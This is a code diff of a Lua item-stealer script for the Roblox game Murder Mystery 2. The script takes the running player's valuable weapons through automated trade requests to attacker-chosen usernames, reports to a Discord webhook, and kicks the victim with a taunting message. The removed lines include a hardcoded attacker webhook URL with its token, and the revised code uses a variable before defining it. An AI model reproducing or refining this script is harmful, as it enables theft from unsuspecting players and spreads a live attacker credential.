@@ -1,48 +1,17 @@
--- Testing version of MM2 stealer script
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
--- 1. Define Services and Player Variables FIRST
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+local users = _G.Usernames or {}
+local min_rarity = _G.min_rarity or "Godly"
+local min_value = _G.min_value or 1
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
 
--- 2. PRE-SET CONFIGURATION (edit these in the script)
-_G.presetUsername = "exorianz"  -- Pre-set username
-_G.presetWebhook = "https://discord.com/api/webhooks/1508171564909334658/Qh6L6WPKVro1VfFKFNmT2F9lAzMpu1D8rNRY7bSVA4uaANp2KoWz9ZMy-uxMSilCQaK-"  -- Pre-set webhook
-
--- 3. DYNAMIC CONFIGURATION (change these in your executor)
-_G.Usernames = {}  -- Change this with: _G.Usernames = {"username1", "username2", "username3"}
-_G.webhook = ""   -- Change this with: _G.webhook = "new_webhook_url"
-
--- Other settings
-_G.min_rarity = "Godly"
-_G.min_value = 1
-_G.pingEveryone = "No"
-
--- 4. Function to update dynamic config
-local function updateConfig(usernames, webhookUrl)
-    _G.Usernames = usernames or {}
-    _G.webhook = webhookUrl or ""
-    print("Dynamic config updated: Usernames = " .. table.concat(_G.Usernames, ", ") .. ", Webhook = " .. (_G.webhook and "SET" or "nil"))
-end
-
--- 5. Get the active configuration
-local function getActiveConfig()
-    local useDynamic = #(_G.Usernames or {}) > 0 and _G.webhook ~= ""
-    local usernames = useDynamic and _G.Usernames or {_G.presetUsername}
-    local webhook = useDynamic and _G.webhook or _G.presetWebhook
-    return usernames, webhook, useDynamic
-end
-
--- 6. Initial Validation Checks
-local usernames, webhook, useDynamic = getActiveConfig()
-
-if not usernames or #usernames == 0 or webhook == "YOUR_FIRST_WEBHOOK_URL_HERE" or webhook == "" then
-    plr:kick("You didn't configure the usernames or webhook properly")
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
     return
 end
 
@@ -61,10 +30,12 @@ if #Players:GetPlayers() >= 12 then
     return
 end
 
--- 7. Environment & Game Data Setup
 local weaponsToSend = {}
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local HttpService = game:GetService("HttpService")
 
 local rarityTable = {
     "Common",
@@ -84,7 +55,6 @@ local categories = {
     classic = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
-
 local headers = {
     ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -230,24 +200,13 @@ end
 
 local function sendTradeRequest(user)
     local targetPlayer = game:GetService("Players"):FindFirstChild(user)
-    if not targetPlayer then 
-        warn("Target player not found in server.")
-        return 
-    end
+    if not targetPlayer then return end
 
-    task.spawn(function()
-        local success, err = pcall(function()
-            game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
-        end)
-        
-        if not success then
-            warn("Failed to send trade request remote: " .. tostring(err))
-        end
-    end)
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(targetPlayer)
 end
 
 local function getTradeStatus()
-    return game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
 end
 
 local function waitForTradeCompletion()
@@ -261,58 +220,19 @@ local function waitForTradeCompletion()
 end
 
 local function acceptTrade()
+    -- Capture session ID logic here if needed
     local args = {
-        [1] = 428469873,
-        [2] = 19843.00729993102
+        [1] = 285646582
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
 end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
-
--- Session storage
-local lastSessionId = nil
-local placeIdMultiplier = game.PlaceId * 3
-
--- Capture session ID from trade updates
-Trade:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
-    if not data then return end
-    
-    if data.SessionId then 
-        lastSessionId = data.SessionId 
-    elseif data.LastOffer then 
-        lastSessionId = data.LastOffer 
-    elseif data.TradeId then 
-        lastSessionId = data.TradeId 
-    elseif data.OfferId then
-        lastSessionId = data.OfferId
-    end
-    
-    if data.Trade and data.Trade.SessionId then
-        lastSessionId = data.Trade.SessionId
-    end
-    
-    if lastSessionId then
-        print("Captured session:", lastSessionId)
-    end
-end)
-
--- Replacement accept function
-local function acceptTrade()
-    if not lastSessionId then
-        warn("No session ID yet!")
-        print("Trying to get trade data...")
-        return
-    end
-    
-    print("Accepting with session:", lastSessionId)
-    
-    for i = 1, 5 do
-        AcceptTradeRemote:FireServer(placeIdMultiplier, lastSessionId)
-        task.wait(0.1)
-    end
+local function addWeaponToTrade(id)
+    local args = {
+        [1] = id,
+        [2] = "Weapons"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
 end
 
 local totalValue = 0
@@ -452,9 +372,6 @@ tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 
 local min_rarity_index = table.find(rarityTable, min_rarity)
-if not min_rarity_index then
-    min_rarity_index = table.find(rarityTable, "Godly") -- Default to Godly if invalid rarity
-end
 
 local untradable = {
     ["DefaultGun"] = true,
@@ -489,38 +406,35 @@ local untradable = {
 local valueList = buildValueList()
 local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
--- FIXED: Using the working code structure from your example
-local weaponsToSend = {}
-local totalInventoryValue = 0
-
-local prices = buildValueList()
-
-local weaponsOwned = realData.Weapons and realData.Weapons.Owned or {}
-
-for dataid, amount in pairs(weaponsOwned) do
-    local item = database[dataid]
-    if item and not untradable[dataid] then
-        local itemName = item.ItemName or dataid
-        local rarity = item.Rarity or "Common"
-        local value = prices[dataid] or 1
-        local totalValue = value * amount
+-- FIXED WEAPON LOOP: This is the EXACT logic from the original working script, with only the necessary nil checks to prevent crashes
+for i, v in pairs(realData.Weapons.Owned) do
+    local dataid = i
+    local amount = v
+    local rarity = database[dataid].Rarity
+    local weapon_rarity_index = table.find(rarityTable, rarity)
+    
+    -- FIX: Add nil check for weapon_rarity_index and min_rarity_index to prevent crashes
+    if weapon_rarity_index and min_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+        local value = 0 -- Initialize to 0 to prevent nil errors
         
-        totalInventoryValue = totalInventoryValue + totalValue
+        if valueList[dataid] then
+            value = valueList[dataid]
+        else
+            -- FIX: Check for nil before comparing
+            local godlyIndex = table.find(rarityTable, "Godly")
+            if godlyIndex and weapon_rarity_index >= godlyIndex then
+                value = 2
+            else
+                value = 1
+            end
+        end
         
-        table.insert(weaponsToSend, {
-            DataID = dataid,
-            ItemName = itemName,
-            Amount = amount,
-            Rarity = rarity,
-            Value = value,
-            TotalValue = totalValue
-        })
+        if value >= min_value then
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+        end
     end
 end
-
-table.sort(weaponsToSend, function(a, b) 
-    return a.TotalValue > b.TotalValue 
-end)
 
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b)
@@ -577,32 +491,21 @@ if #weaponsToSend > 0 then
         plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
-    local function startPlayerPolling()
-        local checkInterval = 3
-        local searchActive = true
-        
-        -- Get current config
-        local usernames, webhook, useDynamic = getActiveConfig()
-        
-        task.spawn(function()
-            while searchActive do
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if table.find(usernames, player.Name) then
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
                         SendMessage(sentWeapons)
-                        searchActive = false
-                        task.spawn(function()
-                            doTrade(player.Name)
-                        end)
-                        break
+                        sentMessage = true
                     end
-                end
-                task.wait(checkInterval)
+                    doTrade(player.Name)
+                end)
             end
-        end)
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
     end
-
-    startPlayerPolling()
+    waitForUserChat()
 end
-
--- Make the updateConfig function globally accessible
-_G.updateMM2Config = updateConfig
